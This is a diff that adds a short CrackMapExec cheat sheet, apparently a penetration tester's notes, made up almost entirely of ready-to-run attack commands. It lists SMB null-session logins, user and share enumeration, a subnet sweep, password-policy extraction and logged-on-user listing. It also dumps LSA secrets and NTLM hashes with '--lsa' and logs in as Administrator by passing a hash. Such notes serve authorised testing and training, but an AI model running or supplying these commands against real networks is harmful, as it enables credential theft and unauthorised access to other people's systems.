@@ -1,0 +1,22 @@
+# Crackmapexec
+crackmapexec smb <target> -u '' -p ''
+crackmapexec smb <target> -u '' -p '' --users
+crackmapexec smb 192.168.1.0/24 
+crackmapexec smb target.txt
+crackmapexec smb target.txt -u <usernmae> -p <password>
+
+#extract password policy 
+crackmapexec smb target.txt -u <usernmae> -p <password> --pass-pol
+
+#enumarte shares
+crackmapexec smb target.txt -u <usernmae> -p <password> --shares
+
+#check for loggedon users 
+crackmapexec smb target.txt -u <usernmae> -p <password> --loggedon-users
+
+#extract the NTLM hashes 
+crackmapexec smb target.txt -u <usernmae> -p <password>  --lsa
+
+#using hash (. dot means local) 
+crackmapexec smb target.txt -u Administrator -H <hash> -d .
+
